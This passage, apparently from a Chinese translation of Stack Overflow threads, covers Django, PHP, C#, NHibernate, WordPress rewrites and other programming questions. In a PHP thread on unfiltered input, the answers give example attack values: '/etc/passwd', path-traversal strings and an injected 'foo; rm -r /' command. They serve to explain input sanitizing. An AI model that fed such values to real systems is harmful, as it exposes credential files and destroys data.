我认为在将 NULL 值更改为 "" 字符串时，您的增加将是最小的。但是，如果 'blah' 不为 null，则它应该包含 NULL 值。

**编辑：**我想我很惊讶为什么我在这里被投票。如果 'blah' 如果不是 null 或空字符串，那么它应该无关紧要，因为您已经在检查 COL1 是否不等于 'blah' 不是 NULL 或空字符串。

# python - 无法通过 AWK/Python 使每个句子在 LaTex 中从新行开始

> ID：636887
> 
> 赞同：1
> 
> 时间：2009-03-12T00:14:08.060
> 
> 标签：python, latex, awk

我在 LaTex 中有一个很长的文档，其中包含段落。这些段落包含句子，因此没有后续句子从新行开始。

**如何让每个后续句子在我的 .tex 文件中从新行开始？**

*我对这个问题的尝试*

我们需要将 \n 放在句子 B 的末尾，其中句子 B 前面有句子 A。

我们不能把 \n 放在有标记的情况下`\`。

我看到这个问题可以通过 AWK 和 Python 来解决。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-03-12T00:36:40.690

因此，您希望 .tex 文件中的每个句子都从新行开始，但不引入额外的段落？那是对的吗？

可能你可以浏览你的文件，每次你看到一个“。” 后跟空格和大写字母，插入换行符。

例如在python中：

```
import re
sentence_end = r'\.\s+([A-Z])'

source = open('myfile.tex')
dest = open('myfile-out.tex', 'w')
for line in source:
    dest.write(re.sub(sentence_end, '.\n\g<1>', line)) 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-03-12T00:38:46.520

每个句号后换行有什么问题？例如：

```
awk '{ gsub(/\. +/, ".\n"); print }'

$ echo "abc. 123\. xyz." | awk '{ gsub(/\. +/, ".\n"); print }'
abc.
123.
xyz. 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2009-03-12T00:49:58.740

如果我正确阅读了您的问题，那么您需要的是`\newline`命令。放在每句话之后。 `\\`是一个捷径。

执行此操作的正则表达式类似于

```
s/\.  ([A-Z])/.\\newline\1/ 
```

# geocoding - 清理遗漏的地理编码（或关于数据清理的一般建议）

> ID：636898
> 
> 赞同：3
> 
> 时间：2009-03-12T00:16:59.507
> 
> 标签：geocoding

我有一个相当大的来自世界各地的位置地址数据库（500k+）。虽然很多地址是重复的或接近重复的。每当输入新地址时，我都会检查它是否已经在数据库中，如果是，我会采用已经存在的纬度/经度并将其应用于新条目。我不链接到单独的表的原因是因为地址没有作为一个组来搜索，而且它们在地址中通常有足够的差异，我想让它们保持不同。如果我的地址完全匹配，我会应用该纬度/经度。如果没有，我会去城市级别应用它，如果我无法在那里找到匹配，我有一个单独的流程要运行。

既然你有广泛的背景，问题就来了。有时我会得到一个远远超出正常可接受误差范围的纬度/经度。然而，奇怪的是，通常只有这些纬度/经度中的一两个超出范围，而其余数据以正确的城市名称存在于数据库中。

你会如何建议清理数据。我有地名数据库，所以理论上我有正确的数据。我正在努力解决的问题是你会运行什么程序来完成这项工作。

如果有人能指出我某些（低级）数据清理方向​​的方向，那就太好了。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-01-13T18:54:09.693

这是一个老问题，但真正的原则永远不会消亡，对吧？

我在一家名为 SmartyStreets 的公司从事地址验证行业。当您拥有大量地址并需要“清理”它们，使其符合官方标准，然后将依赖它用于您运营的任何方面时，您最好查看 CASS 认证的软件（仅限美国；国家/地区差异很大，许多人并没有正式提供这样的服务）。

USPS 授权 CASS 认证的供应商“清理”或“清理”（意思是：标准化和验证）地址数据。我建议您使用 SmartyStreets 的[LiveAddress](http://www.smartystreets.com/Products/)等服务来验证地址或一次性处理列表。还有其他选择，但我认为这对您来说是最灵活和最实惠的。您可以清理您的初始列表，然后在收到新地址时使用 API 来验证它们。

更新：我看到您正在将 JSON 用于各种事情（顺便说一下，我喜欢 JSON，它很容易使用）。提供您需要的服务的供应商并不多，但 SmartyStreets*提供*。此外，您将能够通过阅读该站点上的一些资源/文章来了解地址验证的主题。

# c# - serialport.Write() - 如何正确格式化字节

> ID：636902
> 
> 赞同：2
> 
> 时间：2009-03-12T00:17:48.193
> 
> 标签：c#, compact-framework, serial-port

我需要通过以编程方式打印来与规模对话。

手册指出打印命令只是以回车符 P 结尾。我使用以下代码：

```
Byte[] bytes = {80, 13};
_sp.Write(bytes,0,bytes.Length); 
```

但是每隔一次我从秤上取回 ES 代码，这意味着错误，但它仍然会打印出来。我只是想找出为什么即使它有效，我还是让 ES 回来了。

有任何想法吗？bytes[] 的格式是否正确？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-03-12T01:54:15.637

根据您所说的手册状态，字节是正确的。

也许手册不清楚（或在其他地方指定），并且“回车”实际上是指在某些系统（例如 MS-DOS）中使用的 CR+LF 换行序列。然后字节将是：

```
Byte[] bytes = { 80, 13, 10 }; 
```

# python - Django 表单 - 设置标签

> ID：636905
> 
> 赞同：80
> 
> 时间：2009-03-12T00:18:35.850
> 
> 标签：python, django, inheritance, django-forms

我有一个继承自其他 2 个表单的表单。在我的表单中，我想更改在其中一个父表单中定义的字段的标签。有谁知道如何做到这一点？

我正在尝试在我的 中执行此操作`__init__`，但它会引发错误，提示“'RegistrationFormTOS' 对象没有属性 'email'”。有谁知道我该怎么做？

谢谢。

这是我的表单代码：

```
from django import forms
from django.utils.translation import ugettext_lazy as _
from registration.forms import RegistrationFormUniqueEmail
from registration.forms import RegistrationFormTermsOfService

attrs_dict = { 'class': 'required' }

class RegistrationFormTOS(RegistrationFormUniqueEmail, RegistrationFormTermsOfService):
    """
    Subclass of ``RegistrationForm`` which adds a required checkbox
    for agreeing to a site's Terms of Service.

    """
    email2 = forms.EmailField(widget=forms.TextInput(attrs=dict(attrs_dict, maxlength=75)), label=_(u'verify email address'))

    def __init__(self, *args, **kwargs):
        self.email.label = "New Email Label"
        super(RegistrationFormTOS, self).__init__(*args, **kwargs)

    def clean_email2(self):
        """
        Verifiy that the values entered into the two email fields
        match. 
        """
        if 'email' in self.cleaned_data and 'email2' in self.cleaned_data:
            if self.cleaned_data['email'] != self.cleaned_data['email2']:
                raise forms.ValidationError(_(u'You must type the same email each time'))
        return self.cleaned_data 
```

* * *

## 回答 #1

> 赞同：151
> 
> 时间：2009-03-12T01:06:40.323

你应该使用：

```
def __init__(self, *args, **kwargs):
    super(RegistrationFormTOS, self).__init__(*args, **kwargs)
    self.fields['email'].label = "New Email Label" 
```

首先请注意，您应该使用 super 调用。

* * *

## 回答 #2

> 赞同：56
> 
> 时间：2015-01-27T02:54:37.703

[这是从覆盖默认字段](https://docs.djangoproject.com/en/1.10/topics/forms/modelforms/#overriding-the-default-fields)中获取的示例：

> ```
> from django.utils.translation import ugettext_lazy as _
> 
> class AuthorForm(ModelForm):
>     class Meta:
>         model = Author
>         fields = ('name', 'title', 'birth_date')
>         labels = {
>             'name': _('Writer'),
>         }
>         help_texts = {
>             'name': _('Some useful help text.'),
>         }
>         error_messages = {
>             'name': {
>                 'max_length': _("This writer's name is too long."),
>             },
>         } 
> ```

* * *

## 回答 #3

> 赞同：20
> 
> 时间：2013-10-09T04:14:27.190

您可以`label`在定义表单时设置为字段的属性。

```
class GiftCardForm(forms.ModelForm):
    card_name = forms.CharField(max_length=100, label="Cardholder Name")
    card_number = forms.CharField(max_length=50, label="Card Number")
    card_code = forms.CharField(max_length=20, label="Security Code")
    card_expirate_time = forms.CharField(max_length=100, label="Expiration (MM/YYYY)")

    class Meta:
        model = models.GiftCard
        exclude = ('price', ) 
```

* * *

## 回答 #4

> 赞同：9
> 
> 时间：2009-03-12T01:06:37.797

您可以通过“字段”字典访问表单中的字段：

```
self.fields['email'].label = "New Email Label" 
```

这样您就不必担心表单字段与表单类方法的名称冲突。（否则你不能有一个名为 'clean' 或 'is_valid' 的字段）直接在类主体中定义字段只是为了方便。

* * *

## 回答 #5

> 赞同：3
> 
> 时间：2021-05-27T05:11:50.933

试试 Models.py

```
email = models.EmailField(verbose_name="E-Mail Address")
email_confirmation = models.EmailField(verbose_name="Please repeat") 
```

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2011-04-15T13:00:13.227

它不适用于模型继承，但您可以直接在模型中设置标签

```
email = models.EmailField("E-Mail Address")
email_confirmation = models.EmailField("Please repeat") 
```

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2021-10-05T14:35:15.293

如果所有其他解决方案都不起作用，这个对我有用（将用户类标签更改为 django contrib auth）

```
#in models.py

User._meta.get_field('username').verbose_name = "new name" 
```

# php - 更改 WordPress URL 结构，同时使用 mod_rewrite 维护正确的 301 重定向

> ID：636908
> 
> 赞同：3
> 
> 时间：2009-03-12T00:19:13.527
> 
> 标签：php, wordpress, .htaccess

我目前有一个使用 WordPress 的博客，使用如下 URL：

> > www.domain.com/blog/?pid=384092817

这是在我对任何事情一无所知之前。现在有大量内容，我想将我的 URL 结构更改为：

> > www.domain.com/my-post-title-384092817

有没有办法设置我的 .htaccess 和 mod 重写，所以当用户转到第一个 url 时，他们会得到 301 重定向到第二个 URL？我知道将我的 WordPress 地址 (URL) 设置从 www.domain.com/blog 更改为 www.domain.com 并将我的永久链接设置更改为 /%postname%-%post_id%，但是我如何告诉旧 URL 重定向到新的？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2009-03-12T00:49:19.100

你的意思是当用户访问第二个 URL 时，它会被重写为第一个？这可以做到

```
RewriteRule /blog/.+-(\d+)$ /blog/?pid=$1 
```

如果您想将 301 重定向从旧 URL 发送到新 URL，那么您无法使用 .htaccess 文件真正做到这一点。原因是 Apache 的 mod_rewrite 无法访问您帖子的标题，因此它不知道在 URL 中插入什么标题。您必须使用 PHP 进行重定向。

*编辑*：你知道吗，实际上这并不完全正确。[`RewriteMap`你可以用这个指令](http://httpd.apache.org/docs/2.2/mod/mod_rewrite.html#rewritemap)做一些非常疯狂的事情，比如指示 Apache 要求任意程序执行重写，这样你*就可以*拥有一个 PHP 脚本，它可以执行一些数据库工作来确定标题是什么并据此适当地重写 URL。但这似乎是一种过于复杂的解决方案，我不建议这样做——直接从 PHP 发送重定向会更干净、更容易。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2009-03-17T13:53:43.553

根据您的 WP 版本，您可以只使用[永久链接重定向插件](http://scott.yang.id.au/code/permalink-redirect/)——应该在 WordPress 中为您解决问题，而无需 mod_rewrite。然而，从 WordPress 2.3 开始，其中的大部分内容[应该可以自动运行](http://markjaquith.wordpress.com/2007/09/25/wordpress-23-canonical-urls/)。此时，您唯一需要做的就是将所有 /blog/... 请求重定向到路由，您可以通过 mod_rewrite 大致如下所示：

```
RewriteRule ^blog(.*) $1 [QSA] 
```

# javascript - 与 jQuery 一起使用的最佳 UI 库

> ID：636910
> 
> 赞同：8
> 
> 时间：2009-03-12T00:20:27.033
> 
> 标签：javascript, jquery, user-interface, yui

你们对与 jQuery 一起使用的 UI 库有什么建议。[与其他框架相比， jQuery UI](http://jqueryui.com/)似乎拥有更少的小部件。我最近一直在玩[Dojo Toolkit](http://www.dojotoolkit.org/)，到目前为止它看起来还不错，而且我知道总会有[Yahoo! 用户界面](http://developer.yahoo.com/yui/)，但还有别的吗？

我还需要考虑许可，它可以与在 BSD 许可下许可的开源软件以及内部使用软件一起分发。

* * *

## 回答 #1

> 赞同：16
> 
> 时间：2009-03-12T00:28:49.913

那些其他“ui 库”依赖于整个其他框架。如果您使用 Prototype，请选择 Scriptaculous。如果您使用 Dojo，请使用 Dijit。

如果你使用 jQuery，真的，使用 jQuery UI。您可以通过多种不同的方式来设置 jQuery UI“小部件”的样式；看看主题滚筒画廊：[http ://themeroller.com/](http://themeroller.com/)

缺乏成熟和优雅是什么意思？

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-05-21T01:40:07.713

我发现 jQuery UI 小部件处于不同的阶段。有些是成熟的。有些则更少。

jQuery 的美妙之处在于它非常擅长不干扰其他任何东西，**所以我喜欢将 jQuery 与 YUI 一起**用于我的 UI 小部件。YUI 成熟、专业，“开箱即用”，并针对所有 A 级浏览器进行了全面测试。我不能对所有的 jQuery UI 小部件说同样的话。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-10T22:40:08.257

jquery 工具 - [http://jquerytools.org/demos/](http://jquerytools.org/demos/)是另一个值得一看的选项。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-12-15T09:17:50.043

我会根据当前趋势推荐使用 Twitter Bootstrap，它包含所有必需的元素。

[twitter.github.com/bootstrap/](http://twitter.github.com/bootstrap/)

# php - php 的原生函数与未经过滤的输入一起使用的安全性如何？

> ID：636912
> 
> 赞同：10
> 
> 时间：2009-03-12T00:21:03.553
> 
> 标签：php, security

也许我有点偏执，但是当我正在重写一个联系人模块时，我想到了以下问题：

我可以在 php 的本机函数中使用未经过滤的输入吗？

清理东西以放入数据库，输出到屏幕等很容易，但我想知道例如以下语句是否可能是危险的：

```
 if (file_exists($_POST['brochure'])) {
        // do some stuff
    } 
```

如果有人以某种方式设法发布到该页面，是否可以利用上述代码？

上面的代码只是一个例子，我可以想到我在处理表单时使用的其他函数。

**编辑：**谢谢大家，示例中的 file_exists 实际上是卫生功能的一部分，但是在清理时，正在使用 php 函数，因此它迅速成为鸡和蛋的故事：要使用函数，我必须清理，但是清理我必须使用函数。

不管怎样，我现在有了一些新的想法。

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2009-03-12T00:25:42.853

是的。我所要做的就是将“/etc/passwd”或“includes/dbconnection.php”（或任何内容）发布到您的页面，根据`//do some stuff`实际情况，我可能会删除、修改或读取敏感信息。该`file_exists`函数本身不会做任何你意想不到的事情，但你可以预料到恶意用户会利用你的逻辑。

**始终**清理您的用户输入。***总是。***如果您希望只从一个特定文件夹中获取文件，请不要在输入中允许 .. 或 /

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2009-03-12T00:26:57.377

就其本身而言，这看起来相当安全，但它可以用来泄露信息。它可能允许攻击检查特定文件（例如，等）的存在（或不存在`/etc/passwd`）`/proc/*`。

因此，在此示例中，您应确保`$_POST['brochure']`首先对其进行清理，以仅接受与潜在有效文件名匹配的输入。删除任何包含`..`或以 开头的输入`/`。

其他功能可能会产生更严重的副作用......

* * *

## 回答 #3

> 赞同：6
> 
> 时间：2009-03-12T00:26:55.533

PHP 的内置函数不会在输入错误时执行“意外”操作（例如，`file_exists("foo; rm -r /")`会说“不，文件 'foo; rm -r /' 不存在”）......如果他们这样做，这是一个错误，你可以对 Zend 提起诉讼。

当然，这*并不能*阻止人们利用*您的*代码（例如， ），因此在传递用户提供的输入时`file_exists("../hidden/shell.php")`，您仍然应该（实际上，您应该*始终）小心。*

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2009-03-12T00:24:28.160

'小册子' = '../../../../.htaccess'

这是一个有趣的问题。

我计算机上的 Apache 设置为拒绝列出或查看 .ht* 和 .ini 和 .php.inc 文件，但你现在让我担心了。

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2009-03-12T00:28:09.260

您确实应该养成过滤所有输入的习惯，但您可能想查看[http://www.hardened-php.net/](http://www.hardened-php.net/)，它分发了一个强化补丁和“Suhosin”，默认情况下在许多二进制分发中（ OpenSUSE、Mandriva 和 Debian/Ubuntu）

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2009-03-12T00:29:11.503

你必须问的事实就是你的答案。这不安全。

`file_exists()`并不像其他人那么糟糕，但是如果您没有看到要向其传递数据的函数的源代码，并且不知道它如何处理用户输入，那么您就是在冒险。

将未经过滤的用户数据传递给任何 php 文件系统命令都不是一个好主意。安全的关键是你永远不允许输入上下文切换。在这种情况下，您的最低限度应该是删除路径字符。

总是假设一个敌对的用户，如果他们看到你的源代码，他们可能会做的最坏的事情。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2009-03-12T00:29:39.740

多年来，在 PHP 本身的源代码中发现了安全漏洞，因此函数容易受到缓冲区溢出式攻击 [Suhosin](http://www.hardened-php.net/suhosin/)是/曾经是一个修补 PHP 以消除一些风险的项目。

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2009-03-12T00:31:45.163

我根本不会相信这些功能。

这听起来确实很惊人，但是当我在过去八年中密切关注提交、还原等中的人员及其 C 代码质量时，我一直处于恐惧之中。

* * *

## 回答 #9

> 赞同：-1
> 
> 时间：2009-03-12T00:29:42.673

数据库字符串发生的情况是它可以在有漏洞的地方被检索和使用。对于您的问题的答案，请考虑删除存储字符串然后检索它的步骤。你马上使用它，你也有同样的风险。

# c# - NHibernate Projections 和“Having”子句

> ID：636925
> 
> 赞同：5
> 
> 时间：2009-03-12T00:25:44.587
> 
> 标签：c#, nhibernate, icriteria

我正在使用 NHibernate 使用标准 API 查询我的数据库。我的标准如下：

```
ICriteria c = Session.CreateCriteria(typeof(Transaction));

ProjectionList projections = Projections.ProjectionList();
projections.Add(Projections.Sum("Units"), "Units");
projections.Add(Projections.GroupProperty("Account"), "Account");
projections.Add(Projections.GroupProperty("Security"), "Security");
c.SetProjection(projections); 
```

这工作正常，但我想要的是一种能够将查询限制为仅在“Units”属性> 0时返回的方法。在 SQL 中，我只需要一个`Having Units > 0`子句，但是我无法找到一种在 NHibernate 中执行此操作的方法。有没有人有任何想法或者是我使用 HQL 的唯一选择？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2009-03-12T01:00:10.307

您可以从 Criteria 对象访问 ProjectionCriteria。

```
...
c.SetProjection(projections)
.ProjectionCriteria
.Add(Restrictions.Ge("Units", 0)); 
```

编辑：这个解决方案目前不起作用，但是它应该在 NHibernate 2.1.0 中工作

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2010-09-21T13:00:54.150

对于遇到类似问题的人来说，我只是通过这种方式解决了它：

```
IProjection howMany = Projections.Count("Id").As("HowMany");

ICriteria criteria = session
    .CreateCriteria<L10N>()
    .SetProjection(
        howMany,
        Projections.GroupProperty("Native"),
        Projections.GroupProperty("Locale")
    );

criteria.Add(Restrictions.Gt(howMany,1)); 
```

# c# - 在 C# 中，为什么 String 是一种行为类似于值类型的引用类型？

> ID：636932
> 
> 赞同：420
> 
> 时间：2009-03-12T00:26:59.043
> 
> 标签：c#, string, clr, value-type, reference-type

String 是一种引用类型，尽管它具有值类型的大部分特征，例如不可变和重载 == 以比较文本，而不是确保它们引用同一个对象。

那么为什么字符串不只是一个值类型呢？

* * *

## 回答 #1

> 赞同：373
> 
> 时间：2009-03-12T00:28:33.783

字符串不是值类型，因为它们可能很大，并且需要存储在堆上。值类型（在迄今为止的所有 CLR 实现中）存储在堆栈中。堆栈分配字符串会破坏各种事情：堆栈对于 32 位只有 1MB，对于 64 位只有 4MB，你必须对每个字符串进行装箱，会产生复制惩罚，你不能实习字符串和内存使用会气球等...

*（编辑：添加了关于值类型存储作为实现细节的说明，这导致我们有一个类型的值语义不是从 System.ValueType 继承的。谢谢 Ben。）*

* * *

## 回答 #2

> 赞同：63
> 
> 时间：2009-03-12T00:32:44.680

它不是一个值类型，因为如果它是一个值类型，性能（空间和时间！）会很糟糕，并且每次传递给方法和从方法返回时都必须复制它的值，等等。

它具有保持世界理智的价值语义。你能想象如果编码会有多困难吗？

```
string s = "hello";
string t = "hello";
bool b = (s == t); 
```

设置`b`为`false`？想象一下，几乎任何应用程序的编码都会有多么困难。

* * *

## 回答 #3

> 赞同：37
> 
> 时间：2013-11-07T14:16:20.843

字符串是具有值语义的引用类型。这种设计是一种折衷，它允许某些性能优化。

引用类型和值类型之间的区别基本上是语言设计中的性能权衡。引用类型在构造和销毁以及垃圾收集方面有一些开销，因为它们是在堆上创建的。另一方面，值类型在赋值和方法调用上有开销（如果数据大小大于指针），因为整个对象被复制到内存中，而不仅仅是指针。因为字符串可以（并且通常）比指针的大小大得多，所以它们被设计为引用类型。此外，在编译时必须知道值类型的大小，而字符串并非总是如此。

但是字符串具有**值语义**，这意味着它们是不可变的并且通过值进行比较（即字符串的逐个字符），而不是通过比较引用。这允许某些优化：

**实习**意味着如果已知多个字符串相等，编译器可以只使用单个字符串，从而节省内存。此优化仅在字符串不可变时有效，否则更改一个字符串会对其他字符串产生不可预测的结果。

**字符串文字**（在编译时已知）可以被编译器实习并存储在内存的特殊静态区域中。这节省了运行时的时间，因为它们不需要被分配和垃圾收集。

不可变字符串确实增加了某些操作的成本。例如，您不能就地替换单个字符，您必须为任何更改分配一个新字符串。但与优化的好处相比，这是一个很小的成本。

值语义有效地为用户隐藏了引用类型和值类型之间的区别。如果一个类型具有值语义，那么对于用户来说该类型是值类型还是引用类型并不重要——它可以被认为是一个实现细节。

* * *

## 回答 #4

> 赞同：26
> 
> 时间：2016-06-23T12:49:54.480

这是对一个老问题的迟到答案，但所有其他答案都没有抓住重点，即 .NET 直到 2005 年的 .NET 2.0 才具有泛型。

`String`是引用类型而不是值类型，因为**对于 Microsoft 而言，确保字符串可以以最有效的方式存储在非泛型集合中至关重要**，例如`System.Collections.ArrayList`.

将值类型存储在非泛型集合中需要对`object`称为装箱的类型进行特殊转换。当 CLR 将值类型装箱时，它会将值包装在 a 中`System.Object`并将其存储在托管堆中。

从集合中读取值需要反向操作，称为拆箱。

装箱和拆箱都有不可忽略的成本：装箱需要额外的分配，拆箱需要类型检查。

一些答案错误地声称`string`永远不会被实现为值类型，因为它的大小是可变的。实际上，将字符串实现为包含两个字段的固定长度数据结构很容易：字符串长度的整数和指向 char 数组的指针。您还可以在此基础上使用小字符串优化策略。

如果泛型从一开始就存在，我想将字符串作为值类型可能是一个更好的解决方案，它具有更简单的语义、更好的内存使用和更好的缓存局部性。仅包含小字符串的 A`List<string>`可能是单个连续的内存块。

* * *

## 回答 #5

> 赞同：8
> 
> 时间：2009-06-23T10:17:18.237

不仅字符串是不可变的引用类型。 **多播代表也是如此。** 这就是为什么写作是安全的

```
protected void OnMyEventHandler()
{
     delegate handler = this.MyEventHandler;
     if (null != handler)
     {
        handler(this, new EventArgs());
     }
} 
```

我认为字符串是不可变的，因为这是使用它们并分配内存的最安全方法。为什么它们不是值类型？以前的作者对堆栈大小等的看法是正确的。我还要补充一点，当您在程序中使用相同的常量字符串时，使字符串成为引用类型可以节省程序集的大小。如果你定义

```
string s1 = "my string";
//some code here
string s2 = "my string"; 
```

很有可能“我的字符串”常量的两个实例都只会在您的程序集中分配一次。

如果您想像通常的引用类型一样管理字符串，请将字符串放在新的 StringBuilder(string s) 中。或者使用 MemoryStreams。

如果您要创建一个库，您希望在函数中传递大量字符串，请将参数定义为 StringBuilder 或 Stream。

* * *

## 回答 #6

> 赞同：8
> 
> 时间：2016-05-18T09:18:11.983

简而言之，任何具有确定大小的值都可以被视为值类型。

* * *

## 回答 #7

> 赞同：6
> 
> 时间：2009-03-12T00:34:56.997

此外，字符串的实现方式（每个平台不同）以及何时开始将它们拼接在一起。就像使用`StringBuilder`. 它为你分配一个缓冲区供你复制，一旦你到达终点，它会为你分配更多的内存，希望如果你做一个大的连接性能不会受到阻碍。

也许 Jon Skeet 可以在这里帮忙？

* * *

## 回答 #8

> 赞同：5
> 
> 时间：2009-03-12T02:35:14.290

主要是性能问题。

让字符串表现得像值类型有助于编写代码，但让它成为值类型会对性能产生巨大影响。

如需深入了解，请查看[一篇](http://csharpindepth.com/Articles/General/Strings.aspx)关于 .net 框架中字符串的精彩文章。

* * *

## 回答 #9

> 赞同：3
> 
> 时间：2009-03-12T03:17:14.067

你怎么知道`string`是引用类型？我不确定它的实施方式是否重要。C# 中的字符串是不可变的，因此您不必担心这个问题。

* * *

## 回答 #10

> 赞同：2
> 
> 时间：2009-03-12T01:02:25.263

实际上，字符串与值类型几乎没有相似之处。对于初学者，并非所有值类型都是不可变的，您可以随意更改 Int32 的值，它仍然是堆栈上的相同地址。

字符串是不可变的有一个很好的理由，它与引用类型无关，但与内存管理有很大关系。当字符串大小发生变化时创建一个新对象比在托管堆上转移东西更有效。我认为您将值/引用类型和不可变对象概念混合在一起。

至于“==”：就像你说的“==”是一个运算符重载，再次实现它是为了让框架在处理字符串时更有用。

* * *

## 回答 #11

> 赞同：1
> 
> 时间：2012-06-23T14:48:51.350

不仅仅是由字符数组组成的字符串那么简单。我将字符串视为字符数组 []。因此它们位于堆上，因为引用内存位置存储在堆栈上，并指向堆上数组内存位置的开头。字符串大小在分配之前是未知的……非常适合堆。

这就是为什么一个字符串真的是不可变的，因为当你改变它时，即使它的大小相同，编译器也不知道，并且必须分配一个新数组并将字符分配给数组中的位置。如果您将字符串视为语言保护您不必动态分配内存的一种方式，这是有道理的（像编程一样阅读C）

* * *

## 回答 #12

> 赞同：1
> 
> 时间：2016-03-07T23:01:43.290

冒着又一次神秘的否决票的风险......许多人提到堆栈和内存与值类型和原始类型有关的事实是因为它们必须适合微处理器中的寄存器。如果它占用的位多于寄存器的位，则您不能将其推入或弹出堆栈。...指令是，例如“pop eax”——因为 eax 在 32 位系统上是 32 位宽的。

浮点基本类型由 80 位宽的 FPU 处理。

这一切早在有一种 OOP 语言来混淆原始类型的定义之前就已经决定了，我假设值类型是专门为 OOP 语言创建的术语。

# java - EJB 定时器和可靠性

> ID：636941
> 
> 赞同：1
> 
> 时间：2009-03-12T00:30:11.813
> 
> 标签：java, jboss, glassfish, ejb-3.0, ejb

无论如何，我需要每 5 秒在 App Server (Glassfish) 中调用一个方法。计时器是否足够可靠？我有什么选择。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2009-03-12T03:00:19.410

除非您使用的是实时系统，否则没有“计时器”可以为您提供这种准确性。定时器通常提供“它至少会在你想要的时间发生......但可能会更晚”之类的事情。

这是底层操作系统的东西，而不是 Java 的东西。

编辑：

话虽这么说......你的意思是“准确的 5 秒”还是几毫秒后会起作用？如果几毫秒后工作，那么计时器就可以了。然而，有时“几毫秒”可能是几百秒，这取决于系统中发生的事情（操作系统以及虚拟机中的垃圾收集等事情）。

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2009-03-12T10:13:39.430

是的，看看使用quartz api，它是我所知道的唯一一个免费的java企业级调度api。[http://www.quartz-scheduler.org/](http://www.quartz-scheduler.org/)

我目前在一个大型集群金融应用程序中使用它。文档是一场噩梦，但它通常非常可靠。它是你要得到的可靠的。

卡尔

# asp.net - 从分层 sql 数据返回无序列表

> ID：636943
> 
> 赞同：3
> 
> 时间：2009-03-12T00:31:39.313
> 
> 标签：asp.net, html, sql-server-2005

我有带有 pageId、parentPageId、标题列的表。

有没有办法使用 asp.net、cte、存储过程、UDF ......返回无序列表？

表如下所示：

```
PageID    ParentId    Title
1         null        Home
2         null        Products
3         null        Services
4         2           Category 1
5         2           Category 2
6         5           Subcategory 1
7         5           SubCategory 2
8         6           Third Level Category 1
... 
```

结果应如下所示：

```
Home
Products
    Category 1
        SubCategory 1
            Third Level Category 1
        SubCategory 2
    Category 2
Services 
```

理想情况下，列表也应该包含`<a>`标签，但是如果我找到创建`<ul>`列表的方法，我希望我可以自己添加它。

**编辑1：**我认为已经有解决方案，但似乎没有。我想保持它尽可能简单并不惜一切代价使用 ASP.NET 菜单进行转义，因为它默认使用表。然后我必须使用 CSS 适配器等。

即使我决定走“ASP.NET 菜单”路线，我也只能找到这种方法：[http](http://aspalliance.com/822) ://aspalliance.com/822它使用 DataAdapter 和 DataSet :(

还有更现代或更有效的方法吗？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2009-03-12T04:22:42.113

使用 linq2sql 你可以这样做：

```
List<PageInfo> GetHierarchicalPages()
{
   var pages = myContext.PageInfos.ToList();
   var parentPages = pages.Where(p=>p.ParentId == null).ToList();
   foreach(var page in parentPages)
   {
      BuildTree(
        page, 
        p=> p.Pages = pages.Where(child=>p.pageId == child.ParentId).ToList()
        );
   }
}
void BuildTree<T>(T parent, Func<T,List<T>> setAndGetChildrenFunc)
{
   foreach(var child in setAndGetChildrenFunc(parent))
   {
       BuildTree(child, setAndGetChildrenFunc);
   }
} 
```

假设您在 PageInfo 中定义了 Pages 属性，例如：

```
public partial class PageInfo{
   public List<PageInfo> Pages{get;set;}
} 
```

在层次结构中获取它的处理发生在 Web 应用程序端，这避免了 sql 服务器上的额外负载。另请注意，此类信息非常适合缓存。

您可以像 Rex 提到的那样进行渲染。或者，您可以扩展此实现并使其支持层次结构接口并使用 asp.net 控件。

**更新 1：**对于您在评论中询问的渲染变化，您可以：

```
var sb = new System.IO.StringWriter();
var writer = new HtmlTextWriter(sb);
// rex's rendering code
var html = sb.ToString(); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-03-12T01:06:27.157

最佳实践是使用[IHierarchyData](http://msdn.microsoft.com/en-us/library/system.web.ui.ihierarchydata.aspx)和[IHierarchalEnumerable以及 DataBind 到从](http://msdn.microsoft.com/en-us/library/system.web.ui.ihierarchicalenumerable.aspx)[HierarchalDataBoundControl](http://msdn.microsoft.com/en-us/library/system.web.ui.hierarchicaldatasourcecontrol.aspx)继承的自定义控件（这是[TreeView](http://msdn.microsoft.com/en-us/library/system.web.ui.webcontrols.treeview.aspx)等控件的基础）来执行此操作。

但是，让我们尝试在 c# 中创建一个快速而简单的、不是特别高效的简单示例：

```
//class to hold our object graph in memory
//this is only a good idea if you have a small number of items
//(less than a few thousand)
//if so, this is a very flexible and reusable way to represent your tree
public class Page
{
    public string Title {get;set;}
    public int ID {get;set;}
    public Collection<Page> Pages = new Collection<Page>();

    public Page FindPage(int id)
    {
        return FindPage(this, id);
    }

    private Page FindPage(Page page, int id)
    {
        if(page.ID == id)
        {
            return page;
        }
        Page returnPage = null;
        foreach(Page child in page.Pages)
        {
            returnPage = child.FindPage(id);
            if(returnPage != null)
            {
                break;
            }
        }
        return returnPage;
    }
}

//construct our object graph
DataTable data = SelectAllDataFromTable_OrderedByParentIDAscending();
List<Page> topPages = new List<Page>();
foreach(DataRow row in data.Rows)
{
    Page page = new Page();
    page.Title = (string)row["Title"];
    page.ID = (int)row["PageID"];
    if(row["ParentID"] == null)
    {
        topPages.Add(page);
    }
    else
    {
        int parentID = (int)row["ParentID"];
        foreach(Page topPage in topPages)
        {
